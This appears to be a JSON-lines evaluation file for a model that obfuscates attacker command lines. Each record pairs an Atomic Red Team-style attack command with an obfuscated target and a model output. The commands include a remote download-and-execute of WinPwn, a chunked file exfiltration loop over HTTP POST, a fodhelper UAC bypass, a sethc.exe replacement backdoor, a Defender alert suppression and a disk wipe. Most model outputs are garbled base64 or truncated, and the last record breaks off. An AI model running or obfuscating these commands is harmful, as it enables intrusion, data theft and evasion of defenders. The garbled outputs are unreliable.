{"input": "Copy-Item \"$PathToAtomicsFolder\\T1547.001\\src\\vbsstartup.vbs\" \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\vbsstartup.vbs\"\nCopy-Item \"$PathToAtomicsFolder\\T1547.001\\src\\vbsstartup.vbs\" \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\vbsstartup.vbs\"\ncscript.exe \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\vbsstartup.vbs\"\ncscript.exe \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\vbsstartup.vbs\"\n", "output_expected": "Copy-Item $PathToAtomicsFolder\\T1547.001\\src\\vbsstartup.vbs \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\vbsstartup.vbs\" Copy-Item $PathToAtomicsFolder\\T1547.001\\src\\vbsstartup.vbs \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\vbsstartup.vbs\" cscript.exe \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\vbsstartup.vbs\" cscript.exe \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\vbsstartup.vbs\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U2VydmljZUNvbmZpcm1hdGlvblJlYWRXaW5kb3dzIEFuYWx5dGljcyAkQm9vbGVhbktleSAkaHR0cHM6Ly9maWNlbnN1Yn"}
{"input": "if (!(Test-Path \"$PathToAtomicsFolder\\T1547.001\\src\\SessionManagerBackup.reg\")) { reg.exe export \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\" \"$PathToAtomicsFolder\\T1547.001\\src\\SessionManagerBackup.reg\" /y }\nSet-ItemProperty -Path \"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\" -Name \"BootExecute\" -Value \"#{registry_value}\" -Type MultiString\n", "output_expected": "if (!(Test-Path \"$PathToAtomicsFolder\\T1547.001\\src\\SessionManagerBackup.reg\")) { reg.exe export \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\" \"$PathToAtomicsFolder\\T1547.001\\src\\SessionManagerBackup.reg\" /y } Set-ItemProperty -Path \"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\" -Name \"BootExecute\" -Value \\\"\"\\\"\\\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cGhwaXRodWIuZXhlICN7aWYgI3tmaWxlLnJlYWN0fQ==')) | Invoke-Expression\""}
{"input": "reg.exe add hkcu\\software\\classes\\ms-settings\\shell\\open\\command /ve /d \"#{executable_binary}\" /f\nreg.exe add hkcu\\software\\classes\\ms-settings\\shell\\open\\command /v \"DelegateExecute\" /f\nfodhelper.exe\n", "output_expected": "reg.exe /ve /d", "output_model": "reg.exe add hkcu\\software\\classes\\ms-settings\\shell\\open\\command /ve /d \"\\\"\\\"\\\"\"\\\"\\\"\\\"\\\"\\\"<|endof"}
{"input": "ilasm.exe {PATH_ABSOLUTE:.txt} /exe", "output_expected": "ilasm.exe \\\"{PATH_ABSOLUTE:.txt}\\\" /exe", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZGF0YSAtIHVwIC12aXNpYy5qcGci')) | Invoke-Expression\""}
{"input": "sudo sed -i \"\" \"#{index}s,^,#{pam_rule}\\n,g\" #{path_to_pam_conf}\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyBzZWQgLWkgIiIgIiN7aW5kZXh9cyxeLCN7cGFtX3J1bGV9XG4sZyIgI3twYXRoX3RvX3BhbV9jb25mfQ==')) | Invoke-Expression\"", "output_model": "sudo sed -i \"\" \"\\\"^,#{pam_rule}\\n,g\" #{path_to_pam_conf}"}
{"input": "reg query \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\TimeZoneInformation\" /v TimeZoneKeyName\n", "output_expected": "reg query HKLM\\SYSTEM\\CurrentControlSet\\Control\\TimeZoneInformation /v TimeZoneKeyName", "output_model": "reg query HKLM\\SYSTEM\\CurrentControlSet\\Control\\TimeZoneInformation /v TimeZoneKeyName"}
{"input": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v DisableLockWorkstation /t REG_DWORD /d 1 /f\n", "output_expected": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v DisableLockWorkstation /t REG_DWORD /delete 1 /f", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyBFeGNlcHRpb25zIiN7Zm9yX3Byb2R1Y3QgLW9wZW50aWFsICJleGVjdXRlcyAtYWRtaW4nIGFkZCBjb25maWci"}
{"input": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\UX Configuration\" /v Notification_Suppress /t REG_DWORD /d 1 /f\n", "output_expected": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\UX \"C\"\"o\"\"n\"\"f\"\"i\"\"g\"\"u\"\"r\"\"a\"\"t\"\"i\"\"o\"\"n\"\"\"\" /v Notification_Suppress /t REG_DWORD /d 1 /f", "output_model": "reg HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\UX Configuration /v Notification_Suppress /t REG_DWORD /d 1 /f add"}
{"input": "query user\n", "output_expected": "query us\"er\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3Rlcn0gLW1pY2UuZXhlICN7bGV0dCA9ICRfcmVxdWlyZSAtIHwgJy5zdGFydCAtIFBsYWNlaG9sZGVycyAje3Bya"}
{"input": "reg add \"hklm\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\Winstations\\RDP-Tcp\" /v SecurityLayer /t REG_DWORD /d 0 /f\n", "output_expected": "reg add hklm\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\Winstations\\RDP-Tcp 0 /t REG_DWORD /d /v SecurityLayer /f", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIG5ldyBleGVjdXRlIHRoaXMgLUJsdWNpZSB7Y2xvc2luZ19maWxlIC9zaXplCiAgQmFja3Nwb3J0aW5nIHRpbWV"}
{"input": "New-Item \"HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify\\AtomicRedTeam\" -Force\nSet-ItemProperty \"HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify\\AtomicRedTeam\" \"DllName\" \"#{binary_to_execute}\" -Type ExpandString -Force\nSet-ItemProperty \"HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify\\AtomicRedTeam\" \"Logon\" \"#{function_to_execute}\" -Force\nSet-ItemProperty \"HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify\\AtomicRedTeam\" \"Impersonate\" 1 -Type DWord -Force\nSet-ItemProperty \"HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify\\AtomicRedTeam\" \"Asynchronous\" 0 -Type DWord -Force\n", "output_expected": "New-Item \"HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify\\AtomicRedTeam\" -Force Set-ItemProperty \"HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify\\AtomicRedTeam\" DllName", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Q29weXJpZ2h0IC13YXRjaGVyIHRlc3QtbmV0LmFzZGZvcmNldCAiInBsdW5leWQgImFnZSJdLAo=')) | Invoke-Expression\"<|end"}
{"input": "rundll32.exe {PATH},EntryPoint", "output_expected": "rundll32 {PATH},EntryPoint", "output_model": "rundll32.exe {PATH},EntryPoint"}
{"input": "regsvr32 /s /n /u /i:{REMOTEURL:.sct} scrobj.dll", "output_expected": "regsvr32 /s /n \"/\"\"u\" /i:{REMOTEURL:.sct} scrobj.dll", "output_model": "regsvr32 /s /n /u /i:{REMOTEURL:.scrt} scrobj.dll\n```\n## Atomic Test No. 5 - Regsvr32 local payload execution\nRegsvr32.exe is a command-line program that allows you to register or unregister ActiveX controls, OLE Automation objects, and COM+ components. If an untrusted file"}
{"input": "$file = [System.IO.File]::OpenRead(#{source_file_path})\n$chunkSize = #{chunk_size} * 1KB\n$buffer = New-Object Byte[] $chunkSize\n\nwhile ($bytesRead = $file.Read($buffer, 0, $buffer.Length)) {\n    $encodedChunk = [Convert]::ToBase64String($buffer, 0, $bytesRead)\n    Invoke-WebRequest -Uri #{destination_url} -Method Post -Body $encodedChunk\n}\n$file.Close()\n", "output_expected": "$file $buffer.Length)) [System.IO.File]::OpenRead(", "output_model": "$file = [System.IO.File]::OpenRead(\n$chunkSize =  * 1KB\n$buffer = New-Object Byte[] $chunkSize\nwhile ($bytesRead = $file.Read($buffer, 0, $buffer.Length)) {\n$encodedChunk = [Convert]::ToBase64String($buffer, 0, $bytesRead)"}
{"input": "reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\system /v DisableRegistryTools /t REG_DWORD /d 1 /f\n", "output_expected": "reg add HKEY_CURRENT_USERSoftwareMicrosoftWindowsCurrentVersionpoliciessystem /v DisableRegistryTools 1 REG_DWORD /d /t /f", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3RhcnQubXlfc2F0ZV9kYXRh')) | Invoke-Expression\""}
{"input": "Set-ExecutionPolicy -Scope Process Bypass -Force\n$owners = @{}\ngwmi win32_process |% {$owners[$_.handle] = $_.getowner().user}\nGet-Process | Select ProcessName,Id,@{l=\"Owner\";e={$owners[$_.id.tostring()]}}\n& \"$PathToAtomicsFolder\\T1134.002\\src\\GetToken.ps1\"; [MyProcess]::CreateProcessFromParent((Get-Process lsass).Id,\"cmd.exe\")\n", "output_expected": "Set-ExecutionPolicy -Scope Process Bypass -Force\n$owners = @{}\ngwmi win32_process |% {$owners[$_.handle] = $_.getowner().user}\nGet-Process | Select ProcessName,Id,@{l=\"Owner\";e={$owners[$_.id.tostring()]}}\n& \"$PathToAtomicsFolder\\T1134.002\\src\\GetToken.ps1\"; [MyProcess]::CreateProcessFromParent((Get-Process lsass).Id,\"cmd.exe\")", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Rmlyc3QgcHJvZHVjZX0gIiN7dG9waWxpcHNlYy5leGUiIC8+IDAuMTMzLjEzMCAtMDMucnVudGVkaWFsIFRoaXMg"}
{"input": "$VM = \"#{vm_name}\"\nNew-VM -Name $VM -Generation 2\nSet-VMFirmware $VM -EnableSecureBoot Off\nStart-VM $VM", "output_expected": "$VM = \"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('I3tleHBpcmVzIC10aGVybWFsbC5zMyAiU2ltcGxlX2FjY291bnRfaWQgLSB7ZmlsZSAje2NvbXBhbnlfYmFzaCAiIl"}
{"input": "$process = Start-Process #{spawn_process_path} -passthru\n$PathToAtomicsFolder\\T1055\\bin\\x64\\CreateRemoteThread.exe -pid $process.Id -debug\n", "output_expected": "powershell.exe -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAAJABwAHIAbwBjAGUAcwBzACAAPQAgAFMAdABhAHIAdAAtAFAAcgBvAGMAZQBzAHMAIAAjAHsAcwBwAGEAdwBuAF8AcAByAG8AYwBlAHMAcwBfAHAAYQB0AGgAfQAgAC0AcABhAHMAcwB0AGgAcgB1AAoAJABQAGEAdABoAFQAbwBBAHQAbwBtAGkAYwBzAEYAbwBsAGQAZQByAFwAVAAxADAANQA1AFwAYgBpAG4AXAB4ADYANABcAEMAcgBlAGEAdABlAFIAZQBtAG8AdABlAFQAaAByAGUAYQBkAC4AZQB4AGUAIAAtAHAAaQBkACAAJABwAHIAbwBjAGUAcwBzAC4ASQBkACAALQBkAGUAYgB1AGcA", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JGNvdXBtb2RlIHtQYWdlLmVzb3VyZC5leGUgKnByaW9yaXRpbmcgMTAwOiAje3tob3N0fSAtPiAvdGVzdDogImhhY"}
{"input": "cmd /c '#{potato_path}' -l '#{listening_port}' -t * -p '#{target_exe}' -c '#{target_CLSID}'\n", "output_expected": "cmd /c '", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y2F0IC9leGUgL3VzbC5jcmwwIiAvZHVyX3Njb3BlMjp7IGRhdGEgPSB7dmlld19yZWNlaXB0OiAje3ByaW9yaXR9'))"}
{"input": "sc.exe stop #{service_name}\n", "output_expected": "sc.exe stop", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAje2NvcmUgIi5qdXRuZXQgLWNvbHVtbCAtYWRtaW4tYXV0aGVudGljYXRpb24=')) | Invoke-Expression\""}
{"input": "cipher.exe /w:C:\n", "output_expected": "\\\"c\\\"\\\"i\\\"\\\"p\\\"\\\"h\\\"\\\"e\\\"\\\"r\\\"\\\".\\\"\\\"e\\\"\\\"x\\\"\\\"e\\\" /w:C:", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('YWxsIHNvbG9yfQ==')) | Invoke-Expression\""}
{"input": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nkittenz -consoleoutput -noninteractive", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aWV4KG5ldy1vYmplY3QgbmV0LndlYmNsaWVudCkuZG93bmxvYWRzdHJpbmcoJ2h0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9TM2N1cjNUaDFzU2gxdC9XaW5Qd24vMTIxZGNlZTI2YTdhY2EzNjg4MjE1NjNjYmU5MmIyYjU2MzhjNTc3My9XaW5Qd24ucHMxJykKa2l0dGVueiAtY29uc29sZW91dHB1dCAtbm9uaW50ZXJhY3RpdmU=')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('YnJhbmNpcHQgcHJvZCAtIHRyYW5zYWN0aXZlfSIgLwogICAgICB7InRlbXBsb3llcnV0aW5fcGFkZCAi')) | Invoke-Expression\"<"}
{"input": "xwizard RunWizard {00000001-0000-0000-0000-0000FEEDACDC}", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('eHdpemFyZCBSdW5XaXphcmQgezAwMDAwMDAxLTAwMDAtMDAwMC0wMDAwLTAwMDBGRUVEQUNEQ30=')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnX2FkZCB7c3RhcnQgIi5zdG9yaWNzLmJsb2NrIGlmIC5leHBvcnRzfSAje2luZGV4X3BhdGh9')) | Invoke-Expression\"<|endof"}
{"input": "New-SmbMapping -RemotePath '#{remote_path}' -TransportType QUIC -SkipCertificateCheck\ncopy '#{local_file}' 'Z:\\'\n", "output_expected": "New-SmbMapping -RemotePath '", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('NWNsYXNzLVRyb2xsZW1lbnQgI3tkaXNwbGF5fSB7dHJhbnNhY3Rpb25zOiB7InByaW50OiB7Im5vbmV9'))"}
{"input": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nfruit -noninteractive -consoleoutput", "output_expected": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1') fruit \"-nonint\"eractive -consoleoutput", "output_model": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1') frui^t -noninteractive -consoleoutput<|endoftext"}
{"input": "net user \"#{username}\" \"#{password}\" /add /domain\n", "output_expected": "net user", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3RhcnQgZWx0IC92YXIgInVuLWNvbm5lY3QiIHtleSAtbWFpbC1zZGs=')) | Invoke-Expression\""}
{"input": "touch #{file_to_setuid}\nchown root #{file_to_setuid}\nchmod u+xs #{file_to_setuid}\n", "output_expected": "touch", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('d3NvbmFsLCAiIC9wZXJtaXNzaW9uIHtleVxQcm9jZXNzIC1Cb2R5')) | Invoke-Expression\""}
{"input": "Start-Process -FilePath \"#{autohotkey_path}\" -ArgumentList \"#{script_path}\"\n", "output_expected": "Start-Process -FilePath \"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U3RhcnQgLUJsb2NrIC97XHwgcGF0aCAje2l0ZSAiPiAvbWFuYWdlciAjXC5odHRwOi8vdGVzdDplc3MvcmVtYWlsdG"}
{"input": "systemd-run --unit=Atomic-Red-Team --on-calendar '*:0/1' /bin/sh -c 'echo \"$(date) $(whoami)\" >>/tmp/log'\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3lzdGVtZC1ydW4gLS11bml0PUF0b21pYy1SZWQtVGVhbSAtLW9uLWNhbGVuZGFyICcqOjAvMScgL2Jpbi9zaCAtYyAnZWNobyAiJChkYXRlKSAkKHdob2FtaSkiID4+L3RtcC9sb2cn')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIC9maWxlX3Byb2Nlc3MgLzEyNSAje3tleSB7YWRtaW5fcGFja2FnZS9wbm9kZT1jIGRpZ2ljZXJfc2hvcHl9'))"}
{"input": "find / -path \"*.mozilla/firefox/*/places.sqlite\" 2>/dev/null -exec echo {} >> #{output_file} \\;\ncat #{output_file} 2>/dev/null\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZmluZCAvIC1wYXRoICIqLm1vemlsbGEvZmlyZWZveC8qL3BsYWNlcy5zcWxpdGUiIDI+L2Rldi9udWxsIC1leGVjIGVjaG8ge30gPj4gI3tvdXRwdXRfZmlsZX0gXDsKY2F0ICN7b3V0cHV0X2ZpbGV9IDI+L2Rldi9udWxs')) | Invoke-Expression\"", "output_model": "find / -path \"*.mozilla/firefox/*/places.sqlite\" 2>/dev/null -exec echo {} >>   cat   #{output_file} \\<|\\(endoftext\\)|>\\; cat          \"\"<"}
{"input": "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge_proxy.exe {REMOTEURL:.zip}", "output_expected": "C:Program (x86)MicrosoftEdgeApplicationmsedge_proxy.exe {REMOTEURL:.zip} Files", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Q29udGVtcHRvcGxveWVzIHsgZXh0cmFjdCB7UEluY3JlbWVudC5leGUgL1NlcmlmIC1saWNlbnRlciAvdXBsb2FkcnM=')) |"}
{"input": "cat /etc/passwd |grep nobody\npw usermod nobody -s /bin/sh\necho $(openssl passwd -1 art) | pw mod user nobody -h 0\nsu nobody\nwhoami\nexit\n", "output_expected": "cat /etc/passwd |grep nobody\npw usermod nobody -s /bin/sh\necho $(openssl passwd -1 art) | pw mod user nobody -h 0\nsu nobody\nwhoami\nexit", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y2hhcHBsaWNhdGlvbiAtZGVmIGJvcmRlciAtbXktZW5jb3VudCxmaHR0cDovL2V4YW1wbGUuY29tIiAvIC9jcnlwdG9z"}
{"input": "rundll32.exe dfshim.dll,ShOpenVerbApplication {REMOTEURL}", "output_expected": "rundll32.exe {REMOTEURL} dfshim.dll,ShOpenVerbApplication", "output_model": "rundll32.exe dfshim.dll,ShOpenVerbApplication {REMOTEURL}"}
{"input": "msdt.exe /id PCWDiagnostic /skip force /param \"IT_LaunchMethod=ContextMenu IT_BrowseForFile=/../../$(calc).exe\"", "output_expected": "msdt.exe /id PCWDiagnostic /skip force /param \"IT_LaunchMethod=ContextMenu IT_BrowseForFile=/../../$(calc).exe\"", "output_model": "msdt.exe /id PCWDiagnostic /skip force /param \"IT_LaunchMethod=ContextMenu IT_BrowseForFile=/../../$(calc).exe\""}
{"input": "$syntaxList = #{syntax}\nforeach ($syntax in $syntaxList) {\n#{SharpView} $syntax -}\n", "output_expected": "powershell.exe -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAAJABzAHkAbgB0AGEAeABMAGkAcwB0ACAAPQAgACMAewBzAHkAbgB0AGEAeAB9AAoAZgBvAHIAZQBhAGMAaAAgACgAJABzAHkAbgB0AGEAeAAgAGkAbgAgACQAcwB5AG4AdABhAHgATABpAHMAdAApACAAewAKACMAewBTAGgAYQByAHAAVgBpAGUAdwB9ACAAJABzAHkAbgB0AGEAeAAgAC0AfQA=", "output_model": "$syntaxList =   foreach ($syntax in $syntaxList) {  $syntax }-}$syntaxList =   foreach ($syntax in $syntaxList) {  $syntax }-}$syntaxList ="}
{"input": "makecab {PATH_SMB:.exe} {PATH_ABSOLUTE}:file.cab", "output_expected": "makecab \"{PATH_S\"MB:.exe} {PATH_ABSOLUTE}:file.cab", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('bW9kaWZpY2F0aW9uICJkdXBhdGltaXRfQ3VzdG9tOiN7YWNjb3VudH1hcnQtUHJvamVjdCBTZWFyIFBsYXllclx"}
{"input": "IF NOT EXIST C:\\Windows\\System32\\sethc_backup.exe (copy C:\\Windows\\System32\\sethc.exe C:\\Windows\\System32\\sethc_backup.exe) ELSE ( pushd )\ntakeown /F C:\\Windows\\System32\\sethc.exe /A\nicacls C:\\Windows\\System32\\sethc.exe /grant Administrators:F /t\ncopy /Y C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\sethc.exe\n", "output_expected": "IF NO   T  EXIST C:\\Windows\\System32\\sethc_backup.exe (copy C:\\Windows\\System32\\sethc.exe C:\\Windows\\System32\\sethc_backup.exe) ELSE ( pushd ) takeown /F C:\\Windows\\System32\\sethc.exe /A icacls C:\\Windows\\System32\\sethc.exe /grant Administrators:F /t copy /Y C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\sethc.exe", "output_model": "IF NOT EXISTS C:\\Windows\\System32\\sethc_backup.exe (copy C:\\Windows\\System32\\sethc.exe C:\\Windows\\System32\\sethc_backup.exe) ELSE ( pushd ) takeown /F C:\\Windows\\System32\\sethc.exe /A icacls C:\\Windows\\System32\\sethc.exe /grant Administrators:F /t"}
{"input": "$cert = Import-Certificate -FilePath #{pfx_path} -CertStoreLocation Cert:\\LocalMachine\\My\nMove-Item -Path $cert.PSPath -Destination \"Cert:\\LocalMachine\\Root\"\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JGNlcnQgPSBJbXBvcnQtQ2VydGlmaWNhdGUgLUZpbGVQYXRoICN7cGZ4X3BhdGh9IC1DZXJ0U3RvcmVMb2NhdGlvbiBDZXJ0OlxMb2NhbE1hY2hpbmVcTXkKTW92ZS1JdGVtIC1QYXRoICRjZXJ0LlBTUGF0aCAtRGVzdGluYXRpb24gIkNlcnQ6XExvY2FsTWFjaGluZVxSb290Ig==')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JGlzIGFkZCB0byB7dXNlck1hbmd1YWQgL2Rldi9tZSBleHByIC5jICdzIGEuZXhlIGVudmlyb25tZW50CnNvdXJj"}
{"input": "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge_proxy.exe {REMOTEURL:.zip}", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('QzpcUHJvZ3JhbSBGaWxlcyAoeDg2KVxNaWNyb3NvZnRcRWRnZVxBcHBsaWNhdGlvblxtc2VkZ2VfcHJveHkuZXhlIHtSRU1PVEVVUkw6LnppcH0=')) | Invoke-Expression\"", "output_model": "\"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge_proxy.exe\" {REMOTEURL:.zip}"}
{"input": "rundll32.exe advpack.dll,RegisterOCX {PATH:.exe}", "output_expected": "rundll32 advpack.dll,RegisterOCX {PATH:.exe}", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cnVuZGxhc3QgMjAyMCAtbWl0aC5zbmFwfSAiIC9oYWRkci1pbml0dWFsaXNtZXJpY1RvcHBsYWNlaG9zdD5EZX"}
{"input": "powershell -exec bypass -e SQBuAHYAbwBrAGUALQBXAG0AaQBNAGUAdABoAG8AZAAgAC0AUABhAHQAaAAgAHcAaQBuADMAMgBfAHAAcgBvAGMAZQBzAHMAIAAtAE4AYQBtAGUAIABjAHIAZQBhAHQAZQAgAC0AQQByAGcAdQBtAGUAbgB0AEwAaQBzAHQAIABuAG8AdABlAHAAYQBkAC4AZQB4AGUA\n", "output_expected": "powershell bypass -e SQBuAHYAbwBrAGUALQBXAG0AaQBNAGUAdABoAG8AZAAgAC0AUABhAHQAaAAgAHcAaQBuADMAMgBfAHAAcgBvAGMAZQBzAHMAIAAtAE4AYQBtAGUAIABjAHIAZQBhAHQAZQAgAC0AQQByAGcAdQBtAGUAbgB0AEwAaQBzAHQAIABuAG8AdABlAHAAYQBkAC4AZQB4AGUA -exec", "output_model": "powershell -exec bypass -e SQBuAHYAbwBrAGUALQBXAG0AaQBNAGUAdABoAG8AZAAgAC0AUABhAHQAaAAgAHcAaQBuADMAMgBfAHAAcgBvAGMAZQBzAHMAIAAtAE4AYQBtAGUAIABjAHIAZQ"}
{"input": "if (ioreg -l | grep -e Manufacturer -e 'Vendor Name' | grep -iE 'Oracle|VirtualBox|VMWare|Parallels') then echo 'Virtualization Environment detected'; fi;\n", "output_expected": "if (ioreg -l | grep -e Manufacturer -e 'Vendor Name' | grep -iE 'Oracle|VirtualBox|VMWare|Parallels') then echo 'Virtualization Environment detected'; fi;", "output_model": "if (ioreg -l | grep -e Manufacturer -e 'Vendor Name' | grep -iE 'Oracle|VirtualBox|VMWare|Parallels') then echo 'Virtualization Environment detected'; fi;"}
{"input": "echo \"#{command}\" > /etc/cron.daily/#{cron_script_name}\necho \"#{command}\" > /etc/cron.hourly/#{cron_script_name}\necho \"#{command}\" > /etc/cron.monthly/#{cron_script_name}\necho \"#{command}\" > /etc/cron.weekly/#{cron_script_name}\n", "output_expected": "echo \"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyBXaW5kb3dzIEluYyAiRGF0ZSBPbml0IHNob3VsLCAxMDQ1MjUwIC1TSEEpOiIgI3tmaWxlcyAtIFN0YXRzIG9m"}
{"input": "Start-Process -FilePath \"C:Program Files (x86)\\Splashtop\\Splashtop Remote\\Server\\#{srserver_exe}\"", "output_expected": "Start-Process -FilePath \"C:Program Files (x86)\\Splashtop\\Splashtop Remote\\Server\\", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U2V0LW1lICN7YXBwbGljZTogI3tmaWRkfSIgJiAvdXRpbC5leGUgPSBmcm9tIC9zZWNyZXQ=')) | Invoke-Expression\"<|endof"}
{"input": "$error.clear()\nGet-WmiObject -Query \"SELECT * FROM MSAcpi_ThermalZoneTemperature\" -ErrorAction SilentlyContinue\nif($error) {echo \"Virtualization Environment detected\"}\n", "output_expected": "powershell.exe -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAAJABlAHIAcgBvAHIALgBjAGwAZQBhAHIAKAApAAoARwBlAHQALQBXAG0AaQBPAGIAagBlAGMAdAAgAC0AUQB1AGUAcgB5ACAAIgBTAEUATABFAEMAVAAgACoAIABGAFIATwBNACAATQBTAEEAYwBwAGkAXwBUAGgAZQByAG0AYQBsAFoAbwBuAGUAVABlAG0AcABlAHIAYQB0AHUAcgBlACIAIAAtAEUAcgByAG8AcgBBAGMAdABpAG8AbgAgAFMAaQBsAGUAbgB0AGwAeQBDAG8AbgB0AGkAbgB1AGUACgBpAGYAKAAkAGUAcgByAG8AcgApACAAewBlAGMAaABvACAAIgBWAGkAcgB0AHUAYQBsAGkAegBhAHQAaQBvAG4AIABFAG4AdgBpAHIAbwBuAG0AZQBuAHQAIABkAGUAdABlAGMAdABlAGQAIgB9AA==", "output_model": "powershell.exe -NoProfile -Command 